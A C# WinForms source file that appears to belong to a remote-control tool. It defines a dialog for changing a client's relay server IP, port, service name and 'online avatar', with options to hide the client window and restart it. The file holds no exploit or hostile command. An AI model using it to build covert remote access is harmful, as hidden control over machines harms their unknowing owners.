using System;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using RemoteControl.Protocals.Request;

namespace RemoteControl.Server
{
    class FrmChangeConfig : FrmBase
    {
        private TextBox textBoxServerIP;
        private TextBox textBoxServerPort;
        private TextBox textBoxServiceName;
        private TextBox textBoxOnlineAvatar;
        private CheckBox checkBoxHide;
        private CheckBox checkBoxRestart;
        private Button buttonOk;
        private Button buttonCancel;

        public RequestChangeConfig Request { get; private set; }

        public FrmChangeConfig(ClientParas defaults, string relayIP, int relayPort)
        {
            InitializeConfigForm();
            if (defaults != null)
            {
                textBoxServerIP.Text = !string.IsNullOrWhiteSpace(defaults.ServerIP) ? defaults.ServerIP : relayIP;
                textBoxServerPort.Text = defaults.ServerPort > 0 ? defaults.ServerPort.ToString() : relayPort.ToString();
                textBoxServiceName.Text = defaults.ServiceName ?? "";
                textBoxOnlineAvatar.Text = defaults.OnlineAvatar ?? "";
                checkBoxHide.Checked = defaults.IsHide;
            }
            else
            {
                textBoxServerIP.Text = relayIP;
                textBoxServerPort.Text = relayPort.ToString();
            }
            checkBoxRestart.Checked = true;
        }

        private void InitializeConfigForm()
        {
            this.Text = "更改客户端配置";
            this.StartPosition = FormStartPosition.CenterParent;
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.ClientSize = new Size(420, 245);

            Label labelServerIP = CreateLabel("服务器IP:", 22);
            Label labelServerPort = CreateLabel("服务器端口:", 58);
            Label labelServiceName = CreateLabel("服务名:", 94);
            Label labelOnlineAvatar = CreateLabel("上线头像:", 130);

            textBoxServerIP = CreateTextBox(110, 19);
            textBoxServerPort = CreateTextBox(110, 55);
            textBoxServiceName = CreateTextBox(110, 91);
            textBoxOnlineAvatar = CreateTextBox(110, 127);

            checkBoxHide = new CheckBox();
            checkBoxHide.Text = "隐藏客户端窗口";
            checkBoxHide.Location = new Point(110, 160);
            checkBoxHide.AutoSize = true;

            checkBoxRestart = new CheckBox();
            checkBoxRestart.Text = "应用后重启客户端";
            checkBoxRestart.Location = new Point(230, 160);
            checkBoxRestart.AutoSize = true;

            buttonOk = new Button();
            buttonOk.Text = "确定";
            buttonOk.Location = new Point(244, 202);
            buttonOk.Size = new Size(75, 23);
            buttonOk.Click += buttonOk_Click;

            buttonCancel = new Button();
            buttonCancel.Text = "取消";
            buttonCancel.Location = new Point(325, 202);
            buttonCancel.Size = new Size(75, 23);
            buttonCancel.Click += buttonCancel_Click;

            this.Controls.Add(labelServerIP);
            this.Controls.Add(labelServerPort);
            this.Controls.Add(labelServiceName);
            this.Controls.Add(labelOnlineAvatar);
            this.Controls.Add(textBoxServerIP);
            this.Controls.Add(textBoxServerPort);
            this.Controls.Add(textBoxServiceName);
            this.Controls.Add(textBoxOnlineAvatar);
            this.Controls.Add(checkBoxHide);
            this.Controls.Add(checkBoxRestart);
            this.Controls.Add(buttonOk);
            this.Controls.Add(buttonCancel);
        }

        private static Label CreateLabel(string text, int y)
        {
            Label label = new Label();
            label.Text = text;
            label.Location = new Point(28, y);
            label.Size = new Size(76, 18);
            label.TextAlign = ContentAlignment.MiddleRight;
            return label;
        }

        private static TextBox CreateTextBox(int x, int y)
        {
            TextBox textBox = new TextBox();
            textBox.Location = new Point(x, y);
            textBox.Size = new Size(290, 21);
            return textBox;
        }

        private void buttonOk_Click(object sender, EventArgs e)
        {
            IPAddress address;
            if (!IPAddress.TryParse(textBoxServerIP.Text.Trim(), out address))
            {
                MessageBox.Show("服务器IP不正确。", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            int port;
            if (!int.TryParse(textBoxServerPort.Text.Trim(), out port) || port <= 0 || port > 65535)
            {
                MessageBox.Show("服务器端口不正确。", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            Request = new RequestChangeConfig();
            Request.ServerIP = textBoxServerIP.Text.Trim();
            Request.ServerPort = port;
            Request.ServiceName = textBoxServiceName.Text.Trim();
            Request.OnlineAvatar = textBoxOnlineAvatar.Text.Trim();
            Request.IsHide = checkBoxHide.Checked;
            Request.RestartClient = checkBoxRestart.Checked;
            this.DialogResult = DialogResult.OK;
            this.Close();
        }

        private void buttonCancel_Click(object sender, EventArgs e)
        {
            this.DialogResult = DialogResult.Cancel;
            this.Close();
        }
    }
}
